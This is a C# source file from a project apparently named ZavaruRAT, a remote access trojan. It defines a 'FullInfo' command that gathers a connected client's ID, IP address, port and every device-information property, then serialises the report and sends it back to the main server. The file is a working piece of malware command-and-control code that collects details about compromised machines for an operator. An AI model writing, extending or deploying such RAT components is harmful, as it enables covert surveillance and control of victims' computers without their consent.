#region

using System.Text;
using Google.Protobuf;
using MessagePack;
using RadLibrary.Formatting;
using ZavaruRAT.Node.Commands.Abstractions;
using ZavaruRAT.Node.Runtime;
using ZavaruRAT.Proto;
using ZavaruRAT.Shared;
using ZavaruRAT.Shared.Models.Client;

#endregion

namespace ZavaruRAT.Node.Commands;

public class FullInfo : ICommand
{
    public async Task ExecuteAsync(CommandEvent command, MainServerClient server, ZavaruStoredClient client)
    {
        var sb = new StringBuilder();
        sb.AppendLine($"ZavaruStoredClient: {client.Id}");
        sb.AppendLine($"{client.Client.IP}:{client.Client.Port} (connected: {client.Client.Connected})");
        sb.AppendLine();
        sb.AppendLine("DeviceInfo");
        foreach (var property in typeof(DeviceInfo).GetProperties())
        {
            var value = property.GetValue(client.DeviceInfo);
            var valueStr = FormattersStorage.GetCustomFormatterResult(value);

            sb.AppendLine($"{property.Name}: {valueStr}");
        }

        var serialized = MessagePackSerializer.Serialize(sb.ToString(), ZavaruClient.SerializerOptions);

        await server.SendCommandExecutedAsync(new CommandExecutedEvent
        {
            Success = true,
            HashId = command.HashId,
            ClientId = command.ClientId,
            Result = ByteString.CopyFrom(serialized)
        });
    }
}
